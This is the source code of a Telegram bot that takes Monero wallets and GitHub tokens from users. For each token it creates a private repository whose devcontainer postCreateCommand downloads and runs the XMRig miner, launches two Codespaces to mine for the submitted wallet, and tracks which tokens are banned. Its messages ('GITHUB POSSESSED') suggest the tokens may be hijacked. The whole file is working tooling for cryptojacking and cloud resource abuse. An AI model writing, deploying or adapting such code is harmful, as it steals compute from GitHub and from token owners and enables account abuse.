import os
import sqlite3
import requests
import base64
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"

conn = sqlite3.connect("data.db", check_same_thread=False)
c = conn.cursor()
c.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, wallet TEXT)")
c.execute("CREATE TABLE IF NOT EXISTS tokens (user_id INTEGER, token TEXT)")
conn.commit()

def github_api_upload_file(token, username, repo, filename, content):
    encoded = base64.b64encode(content.encode("utf-8")).decode("utf-8")
    return requests.put(
        f"https://api.github.com/repos/{username}/{repo}/contents/{filename}",
        headers={"Authorization": f"token {token}"},
        json={
            "message": f"Add {filename}",
            "content": encoded,
            "branch": "main"
        }
    )

def create_repo_and_codespaces(github_token, wallet):
    headers = {"Authorization": f"token {github_token}"}
    user_info = requests.get("https://api.github.com/user", headers=headers).json()
    username = user_info.get("login")

    if not username:
        return None, False

    repo_name = f"xmrig-{os.urandom(3).hex()}"
    repo_res = requests.post("https://api.github.com/user/repos", headers=headers, json={
        "name": repo_name,
        "private": True,
        "auto_init": True
    })

    if repo_res.status_code != 201:
        return username, False

    files_to_upload = {
        "devcontainer.json": '''{
  "name": "XMRig Codespace",
  "postCreateCommand": "bash c9ep7c.sh"
}''',
        "c9ep7c.sh": f'''#!/bin/bash
wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz
tar -xvf xmrig-6.21.1-linux-x64.tar.gz
cd xmrig-6.21.1
chmod +x xmrig
./xmrig -o gulf.moneroocean.stream:10128 -u {wallet} -p codespace --donate-level 1 --threads 4
''',
        "README.md": "# Auto mining setup"
    }

    for filename, content in files_to_upload.items():
        github_api_upload_file(github_token, username, repo_name, filename, content)

    codespace_payload = {
        "repository": f"{username}/{repo_name}",
        "machine": "standardLinux"
    }

    for _ in range(2):
        requests.post(
            "https://api.github.com/user/codespaces",
            headers={**headers, "Accept": "application/vnd.github+json"},
            json=codespace_payload
        )

    return username, True

async def wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: /wallet <XMR_wallet>")
        return
    wallet = context.args[0]
    c.execute("INSERT OR REPLACE INTO users (user_id, wallet) VALUES (?, ?)", (user_id, wallet))
    conn.commit()
    await update.message.reply_text("✅ Wallet saved! You're ready to mine.")

async def token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("❌ Usage: /token <GitHub_token_1> <GitHub_token_2> ...")
        return

    c.execute("SELECT wallet FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    if not row:
        await update.message.reply_text("⚠️ First set your wallet using /wallet")
        return
    wallet = row[0]

    reply = ""
    for github_token in context.args:
        c.execute("INSERT INTO tokens (user_id, token) VALUES (?, ?)", (user_id, github_token))
        conn.commit()
        username, success = create_repo_and_codespaces(github_token, wallet)
        if success:
            reply += f"😈 GITHUB POSSESSED SUCCESSFULLY!\n🧠 Logged in as: {username}\n✅ 2 Codespaces started\n\n"
        else:
            reply += f"❌ Token {github_token[:8]}... is invalid or banned.\n\n"

    await update.message.reply_text(reply.strip())

async def check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    c.execute("SELECT token FROM tokens WHERE user_id = ?", (user_id,))
    tokens = c.fetchall()
    active = banned = 0
    for (token,) in tokens:
        res = requests.get("https://api.github.com/user", headers={"Authorization": f"token {token}"})
        if res.status_code == 200:
            active += 1
        else:
            banned += 1
    total = active + banned
    await update.message.reply_text(
        f"👤 Your GitHub Account Status\n━━━━━━━━━━━━━━━\n✅  Active Tokens: {active}\n❌  Banned Tokens: {banned}\n💾 Total Provided: {total}\n━━━━━━━━━━━━━━━"
    )

app = ApplicationBuilder().token(BOT_TOKEN).build()
app.add_handler(CommandHandler("wallet", wallet))
app.add_handler(CommandHandler("token", token))
app.add_handler(CommandHandler("check", check))
app.run_polling()